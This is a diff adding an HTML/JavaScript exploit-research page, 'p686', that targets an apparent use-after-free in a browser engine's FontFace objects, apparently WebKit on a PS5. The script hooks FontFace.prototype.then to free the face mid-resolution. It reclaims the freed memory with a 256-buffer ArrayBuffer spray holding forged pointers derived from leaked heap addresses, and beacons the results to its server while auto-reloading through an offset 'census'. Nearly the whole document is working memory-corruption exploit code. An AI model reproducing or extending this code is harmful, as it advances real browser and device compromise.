@@ -1,0 +1,322 @@
+<!--
+  p686: FontFace impl-walk bisect — which fields of the DefaultWeakPtrImpl
+        does the continuation read when +0x68 holds a valid stale impl?
+
+  Background (p685 census, #181 6681183419):
+    +0x68 = priorImpl  -> SURVIVES, and the engine SKIPS its pair write.
+                          The walk consumes the impl's own words.
+    +0x68 = T          -> dies (wrong-shape pointer followed).
+  Impl layout (cobra): +0x00 refcount/deletion-begun bits, +0x08 m_ptr
+  (points at the live FontFace wrapper), +0x10 thread flag; size 0x18.
+
+  Arms forge +0x68 = priorImpl + delta (delta slides the interpreted
+  window across / past the impl). The survive/crash boundary maps which
+  offsets the walk dereferences relative to the impl pointer.
+
+  Protocol v3 (prime/arm alternation): p686's first clean run proved the
+  2nd consecutive UAF load in a process dies 9/9 REGARDLESS of the forge;
+  every census load therefore follows a fresh PRIME load (leak without
+  forge), so every walk observation is an arm#1-class load.
+    [this prime] -> [arm delta k] -> [this prime] -> [arm delta k+1] ...
+
+
+  #0-#12   near set: 0, +-8, +-0x10, +-0x18, +-0x20, +-0x28, +-0x40
+  #13-#24  wide set: +-0x80, +-0x100, +-0x400, +-0x1000, +-0x4000, +-0x10000
+  #25      'T' — +0x68 = priorT (different pointer shape, different zone)
+
+  See also the v4 fix notes in the getter: forges are little-endian; the
+  pre-fix runs were byte-reversed and their content rows are re-measurements.
+
+  Same discipline as p685: blind forge into all 16 buffers BEFORE the
+  check() walk; NO beacon inside the poisoned then-getter; auto-cycle via
+  localStorage p686arm (an arm load stores its successor before it runs, so
+  a death resumes there); prime values are read from p685's stored T/impl
+  (same origin).
+
+  v7 AUTO-WRAP: when CENSUS_CAP is reached, the page clears its counters,
+  clears the server-side census state via /p686reset=1 and immediately
+  re-enters the cycle. Works with PS5 root-only access (/? or / alone).
+
+  CRASH_CLASS: HIGH (each arm load may die — that is the evidence)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p686</title></head>
+<body>p686: impl-walk bisect
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+// v7 AUTO-WRAP: total-load budget. Counted at load start so that dying
+// loads also count; at CENSUS_CAP the page resets and enters the census.
+// The JS resets loadNo in localStorage, falls through to the main loop.
+var CENSUS_CAP=160;
+var loadNo=0;
+try{var _l=parseInt(localStorage.getItem('p686loads')||'0',10);loadNo=_l+1;localStorage.setItem('p686loads',String(loadNo));if(loadNo>CENSUS_CAP){loadNo=1;localStorage.setItem('p686loads','1');localStorage.removeItem('p686arm');localStorage.removeItem('p686phase');localStorage.removeItem('p686T');localStorage.removeItem('p686I');try{var rx=new XMLHttpRequest();rx.open('GET','/p686reset=1',false);rx.send();}catch(e){}}}catch(e){}
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P686-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+function qw(v,off){var s='';for(var i=7;i>=0;i--)s+=hex8(v[off+i]);return s;}
+
+var arm=parseInt(location.hash.slice(1));if(isNaN(arm))arm=0;
+// death detection FIRST — before this load's own START beacon resets alive
+var diedSince=0,deadArm=null,reclaimMode=false;
+try{
+  var sx=new XMLHttpRequest();sx.open('GET','/p686state',false);sx.send();
+  if(sx.status===200){
+    var st=JSON.parse(sx.responseText);
+    if(st.died){diedSince=1;deadArm=st.deadArm;}
+    // Reclaim-rate mode: every load is a zero-shape prime, so no walk ever
+    // follows a forged pointer and nothing can die. That makes the page
+    // auto-cycle unattended and isolates one question — how often a load
+    // adopts the spray — from forge content and from load position.
+    reclaimMode = (st.mode==='reclaim');
+    // Operator rewind: `GET /?p686reset=1&arm=N` makes the next load restart
+    // the series at arm N, so a version whose forge never landed can be
+    // re-measured without touching console storage by hand. One-shot.
+    if(typeof st.armFrom==='number'){
+      arm=st.armFrom;
+      try{
+        localStorage.setItem('p686arm',String(arm));
+        localStorage.removeItem('p686phase');
+        localStorage.removeItem('p686T');
+        localStorage.removeItem('p686I');
+      }catch(e){}
+      // `?` is load-bearing: without it the query is empty, the server's
+      // reset branch never runs, armFrom survives, and every subsequent load
+      // rewinds to arm 0 again while wiping the stored pair. The 23:33 run
+      // rewound on all four loads and never reached a single arm.
+      try{var xr=new XMLHttpRequest();xr.open('GET','/?p686reset=1&arm=clear',false);xr.send();}catch(e){}
+      emit('STATE','operator rewind to arm '+arm);flush();
+    }
+  }
+}catch(e){}
+// auto-cycle like p685: root-only console, localStorage carries the index
+(function(){
+  try{
+    var stored=parseInt(localStorage.getItem('p686arm'));
+    if(!isNaN(stored))arm=stored;
+  }catch(e){}
+})();
+emit('START','v8.2 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
+
+var priorT='',priorI='';
+// if the previous load died, its T/impl are addresses of the dead process
+try{
+  priorT=localStorage.getItem('p686T')||localStorage.getItem('p685T')||'';
+  priorI=localStorage.getItem('p686I')||localStorage.getItem('p685I')||'';
+}catch(e){}
+if(diedSince){
+  emit('STATE','previous load (arm '+deadArm+') DIED — invalidating T/impl, re-prime');
+  priorT='';priorI='';
+  // No arm advance here. An arm load stores its successor in localStorage
+  // before it runs (arm-mode block below), so storage already points at the
+  // arm to resume. A dead prime stores nothing and must be retried at the
+  // same label. Advancing in this branch skipped one arm per death and, with
+  // a hardcoded cap, silently dropped every arm past it.
+  emit('STATE','resume arm '+arm+' (dead '+deadArm+')');
+}
+if(priorT)emit('PRIOR-T',priorT);else emit('PRIOR-T','none');
+if(priorI)emit('PRIOR-I',priorI);else emit('PRIOR-I','none');
+flush();
+
+// Arm table v4. Near set replicates the v2/v3 bisect; the wide set probes
+// how far from the impl the walk still tolerates a followed pointer
+// (ThreadHeap neighbours are dense: small +-deltas often land in live
+// objects). 'T' forges priorT at +0x68 — a pointer of a different SHAPE
+// and different zone than impl; with the byte-order fix this is the clean
+// shape discriminator (its pre-fix counterpart died as byte-reversed
+// garbage, so that row needs re-measurement too).
+// ALL forges are written little-endian (LSB first) — see the getter below.
+var ARMS=[0,8,-8,0x10,-0x10,0x18,-0x18,0x20,-0x20,0x28,-0x28,0x40,-0x40,
+          0x80,-0x80,0x100,-0x100,0x400,-0x400,0x1000,-0x1000,
+          0x4000,-0x4000,0x10000,-0x10000,'T',
+          // v5: the +0x58 axis (m_table). The v3.5/LE-correct run showed
+          // +0x68 forges are left intact by the walk at every delta; if
+          // content semantics exist anywhere it is probably the OTHER
+          // face-member the map assigns to this object.
+          '58I','58T','58Z','58I+8','58T+8'];
+function dlabel(a){var x=ARMS[a];return x==='T'?'T':(typeof x==='string'?'0x58='+x.slice(2):((x>=0?'+':'-')+'0x'+Math.abs(x).toString(16)));}
+var delta=ARMS[arm];
+if(typeof delta!=='number'&&typeof delta!=='string')arm=0,delta=ARMS[0];
+// phase machine PRIME <-> ARM, strictly alternating. p686 10:12 run proved
+// the 2nd consecutive UAF load of a process dies regardless of forge
+// content (9/9, even delta=0 exact impl), while arm#1-class loads survive
+// at every delta. Every census load must follow a fresh prime so the
+// forge outcome measures content, not load position.
+var phase=null;
+try{phase=localStorage.getItem('p686phase');}catch(e){}
+var primeMode = reclaimMode ? true : (!!diedSince || (phase!=='arm') || !priorI);
+if(primeMode)phase='prime';
+var forgeVal='';
+var FORGE_CELLS=[];
+// next-load phase is fixed here: after a prime the next load runs the arm;
+// after an arm load (survived or not) the next load re-primes. A dead load
+// short-circuits this via diedSince anyway.
+if(!reclaimMode)try{localStorage.setItem('p686phase', primeMode?'arm':'prime');}catch(e){}
+if(primeMode){
+  if(reclaimMode)emit('SEQ','reclaim-rate probe: zero shape, no forge');
+  else emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+dlabel(arm));
+  flush();
+}else{
+  // forge plan: list of {off,val} qwords written little-endian (LSB first)
+  // into every spray buffer. 0x00..0x6f is zeroed first so the face shape
+  // is deterministic. '58X' arms target m_table; everything else targets
+  // the wrapper slot at +0x68.
+  FORGE_CELLS=[];
+  if(typeof delta==='string'){
+    var base,dv=0;
+    if(delta==='58Z'){forgeVal='0000000000000000';}
+    else{
+      base=delta.charAt(2)==='I'?priorI:priorT;
+      var add=delta.slice(3);
+      if(add)dv=parseInt(add,16);
+      var vv=parseInt(base,16)+dv;if(vv<0)vv+=0x10000000000;
+      forgeVal=('0000000000000000'+vv.toString(16)).slice(-16);
+    }
+    FORGE_CELLS.push({off:0x58,val:forgeVal});
+    // complete the face shape: wrapper slot keeps the real impl
+    FORGE_CELLS.push({off:0x68,val:priorI});
+    emit('ARM','off=0x58 src='+delta+' val=0x'+forgeVal);
+  }else if(delta==='T'){
+    forgeVal=priorT;
+    FORGE_CELLS.push({off:0x68,val:forgeVal});
+    emit('ARM','off=0x68 src=T delta=0 val=0x'+forgeVal);
+  }else{
+    var v=parseInt(priorI,16)+delta;
+    if(v<0)v+=0x10000000000;
+    forgeVal=('0000000000000000'+v.toString(16)).slice(-16);
+    FORGE_CELLS.push({off:0x68,val:forgeVal});
+    emit('ARM','off=0x68 delta='+delta+' val=0x'+forgeVal);
+  }
+  var nxt=arm>=ARMS.length-1?0:arm+1;
+  // An arm load stores its successor BEFORE it runs: if this load dies, the
+  // reload resumes at nxt and nothing else has to advance the counter.
+  // Prime loads store nothing, so a dead prime is retried at its own label.
+  try{localStorage.setItem('p686arm',String(nxt));}catch(e){}
+  emit('SEQ','next arm = '+nxt+' delta='+dlabel(nxt));
+}
+flush();
+
+var style,ff,fired=false,map=[],SPRAY_N=256;
+// v8.1: the family names carry the load number. Under a repeated family the
+// second load of a WebProcess never adopted our spray (6/6 no-reclaim), while
+// the first load after a process restart always did (2/2). A per-load unique
+// name discriminates "the cascade rebuild does not happen on a reused name"
+// from "a process only ever gives one free": if names are the cause, reclaim
+// returns on every load and the census becomes measurable.
+var S='s'+loadNo, F='f'+loadNo;
+style=document.createElement('style');
+style.textContent="@font-face { font-family: "+S+"; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(style);
+ff=new FontFace(F,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);
+void ff.loaded;
+window.__p686keep=ff;
+
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(fired)return undefined;
+    fired=true;
+    // free -> spray -> [blind forge unless priming] -> walk
+    // NO beacons in this window
+    style.remove();
+    try{document.fonts.delete(ff);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    // v8.2: 256 buffers, not 16. On a cold process 16 always won; on a warm
+    // one they never did, three loads in a row, which reads as a 192-byte
+    // freelist already holding the previous document's spray. 256 x 192 B is
+    // 48 KiB, three orders below the 2048-buffer battery that OOMs a process.
+    for(var k=0;k<SPRAY_N;k++){
+      var ab=new ArrayBuffer(192);
+      var v=new Uint8Array(ab);
+      // FULL deterministic AB in every mode. Prime mode restores the
+      // natural face shape (leaked pair) — without this, a prime can
+      // recycle memory of a previously ARM-walked chunk that still
+      // carries its forge bytes at 0x58/0x68 and the prime's walk then
+      // consumes OUR leftovers (the ~50% prime deaths of the v5 run).
+      for(var c=0;c<192;c++)v[c]=0;
+      // Reclaim sentinel: the engine's initializeWrapper() clears
+      // m_mayBePurged (+0x85) on the chunk it actually adopts (p581/p588d),
+      // so 0xAA here is the only honest reclaim proof. A nonzero-byte count
+      // cannot serve as one: our own forge prefill is nonzero by construction.
+      v[0x85]=0xAA;
+      if(primeMode && !reclaimMode && priorT.length===16 && priorI.length===16){
+        for(var b=0;b<8;b++){
+          v[0x58+b]=parseInt(priorT.substr(16-2*(b+1),2),16);
+          v[0x68+b]=parseInt(priorI.substr(16-2*(b+1),2),16);
+        }
+      }else{
+        // Arm mode (a prime without a leaked pair leaves FORGE_CELLS empty, so
+        // this is a no-op there). v5.1 guarded this with `else if(primeMode)`,
+        // a branch that can never be true at this point: every arm sprayed
+        // zeros and no forge value ever reached memory. Arms 9 and 10 of the
+        // 2026-11-08 run are nulls for this reason.
+        for(var ci=0;ci<FORGE_CELLS.length;ci++){
+          var fc=FORGE_CELLS[ci];
+          for(var b=0;b<8;b++)v[fc.off+b]=parseInt(fc.val.substr(16-2*(b+1),2),16);
+        }
+      }
+      map.push({ab:ab,view:v});
+    }
+    try{document.fonts.check('1em '+S);}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+// PREFREE boundary beacon: everything after this and before RESOLVED (the
+// poisoned-then getter window: free -> spray -> blind forge -> check walk)
+// is un-beaconable by design. A death with PREFREE but no RESOLVED means
+// the process died inside that window (or the walk).
+emit('PREFREE','loading '+F+'/'+S);flush();
+
+document.fonts.load('1em '+F+', '+S,'AB').then(function(){
+  emit('RESOLVED','promise ok');
+},function(){emit('REJECTED','promise rejected');});
+
+setTimeout(function(){
+  // Reclaim oracle: +0x85 was seeded 0xAA in every spray buffer, and only the
+  // chunk the engine adopted has it cleared to 0x00.
+  var hit=-1;
+  for(var i=0;i<map.length;i++){if(map[i].view[0x85]!==0xAA){hit=i;break;}}
+  if(hit<0)emit('SCAN','no-reclaim 85=0xAA in all '+map.length);
+  else{
+    var v=map[hit].view;
+    emit('SCAN','reclaimed buf='+hit+' 85=0x'+hex8(v[0x85]));
+    emit('PAIR','58='+qw(v,0x58)+' 68='+qw(v,0x68));
+    var cells='';
+    for(var o=0x18;o<=0x68;o+=8)cells+=o.toString(16)+':'+qw(v,o)+' ';
+    emit('RUN',cells.trim());
+    if(primeMode){
+      try{
+        localStorage.setItem('p686T',qw(v,0x58));
+        localStorage.setItem('p686I',qw(v,0x68));
+        // p685-era keys are values of possibly-dead processes; this prime's
+        // values are the only truth now
+        localStorage.removeItem('p685T');localStorage.removeItem('p685I');
+        // No arm write here. The death is reported so this load re-primes,
+        // but the resume label comes from the last arm load's stored
+        // successor. Writing deadArm+1 here skipped one arm whenever the
+        // dead load was a prime (a prime must be retried at its own label).
+        if(deadArm!==null)emit('SEQ','dead arm '+deadArm+' — resume label comes from stored successor');
+      }catch(e){}
+      emit('STORED','T='+qw(v,0x58)+' I='+qw(v,0x68));
+    }
+  }
+  document.body.offsetHeight;
+  emit('ALIVE','survived mode='+(primeMode?'prime':'arm')+' arm='+arm+' delta='+dlabel(arm)+' val=0x'+forgeVal);
+  flush();
+  emit('DONE','arm='+arm);
+  flush();
+  // v7 AUTO-WRAP: this load survived, so the WebProcess is healthy and
+  // can schedule the next load itself. A load that dies never reaches here.
+  setTimeout(function(){location.reload();},900);
+},150);
+
+})();
+</script>
+</body>
+</html>
